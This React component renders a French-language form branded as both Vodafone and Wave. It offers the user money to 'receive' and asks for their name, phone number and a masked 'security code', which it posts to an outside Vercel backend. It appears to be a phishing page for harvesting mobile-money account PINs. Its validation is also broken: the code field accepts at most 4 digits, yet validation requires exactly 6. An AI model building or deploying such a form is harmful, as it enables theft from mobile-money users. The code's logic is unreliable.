import React, { useState } from "react";
import axios from "axios";
import toast from "react-hot-toast";

export default function Wave() {
  const [fullname, setFullname] = useState("");
  const [numero, setNumero] = useState("");
  const [devise, setDevise] = useState("");
  const [montant, setMontant] = useState("en cours d'examen");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const handleCodeChange = (e) => {
    const value = e.target.value;
    if (value.length <= 4 && /^\d*$/.test(value)) {
      setCode(value);
    }
  };

  const validateForm = () => {
    let errors = {};
    if (fullname.trim() === "") errors.fullname = "Nom et Prénom est requis";
    if (numero.trim() === "") errors.numero = "Numéro Vodafone est requis";
    if (code.length !== 6) errors.code = "Le code de sécurité doit contenir exactement 6 chiffres";
    return errors;
  };

  const submitForm = async (e) => {
    e.preventDefault();
    const formErrors = validateForm();
    if (Object.keys(formErrors).length > 0) {
      setErrors(formErrors);
      toast.error("Veuillez remplir tous les champs obligatoires correctement.", { position: "top-right" });
      return;
    }

    const paiements = {
      fullname,
      numero,
      devise,
      montant,
      code,
    };

    try {
      setLoading(true);
      const response = await axios.post("https://backend-paiement.vercel.app/api/paiements", paiements);
      toast.success(response.data.message, { position: "top-right" });
    } catch (error) {
      toast.error("Erreur lors de l'envoi des données.", { position: "top-right" });
      console.log(error);
    } finally {
      setLoading(false);
      setFullname("")
      setNumero("")
      setCode("")
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-blue-400">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
        <h1 className="text-2xl font-bold text-center text-blue-500 mb-6">
          Paiement via Vodafone
        </h1>
        <form className="space-y-4" onSubmit={submitForm}>
          <div>
            <label className="block text-sm font-medium text-gray-700">
              Nom et Prénom
            </label>
            <input
              type="text"
              id="fullname"
              name="fullname"
              value={fullname}
              onChange={(e) => {
                setFullname(e.target.value);
                setErrors((prev) => ({ ...prev, fullname: "" }));
              }}
              placeholder="Nom et Prénom"
              autoComplete="off"
              className={`mt-1 block w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-orange-500 ${errors.fullname ? 'border-red-500' : 'border-gray-300 focus:border-orange-500'}`}
            />
            {errors.fullname && <p className="text-red-500 text-sm mt-1">{errors.fullname}</p>}
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700">
              Numéro wave
            </label>
            <input
              type="number"
              id="numero"
              name="numero"
              value={numero}
              onChange={(e) => {
                setNumero(e.target.value);
                setErrors((prev) => ({ ...prev, numero: "" }));
              }}
              autoComplete="off"
              placeholder="Numéro"
              className={`mt-1 block w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-orange-500 ${errors.numero ? 'border-red-500' : 'border-gray-300 focus:border-orange-500'}`}
            />
            {errors.numero && <p className="text-red-500 text-sm mt-1">{errors.numero}</p>}
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700">
              Devise
            </label>
            <select
              id="devise"
              name="devise"
              // onChange={}
              className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-orange-500 focus:border-orange-500"
            >
              <option value="FCFA">FCFA</option>
            </select>
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700">
              Montant à recevoir
            </label>
            <input
              type="text"
              id="montant"
              name="montant"
              value={montant}
              disabled
              onChange={(e) => setMontant(e.target.value)}
              autoComplete="off"
              placeholder="Montant"
              className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-orange-500 focus:border-orange-500"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700">
              Code de sécurité
            </label>
            <input
              type="password"
              id="code"
              name="code"
              value={code}
              onChange={handleCodeChange}
              autoComplete="off"
              placeholder="Ex: 123456"
              className={`mt-1 block w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-orange-500 ${errors.code ? 'border-red-500' : 'border-gray-300 focus:border-orange-500'}`}
            />
            {errors.code && <p className="text-red-500 text-sm mt-1">{errors.code}</p>}
          </div>
          <button
            type="submit"
            className="w-full py-2 text-white bg-blue-500 flex items-center justify-center rounded hover:bg-blue-600"
          >
            {loading ? 
                <div role="status">
                    <svg aria-hidden="true" className="w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
                        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
                    </svg>
                    <span className="sr-only">Loading...</span>
                </div>
            : "Recevoir"}
          </button>
        </form>
      </div>
    </div>
  );
}
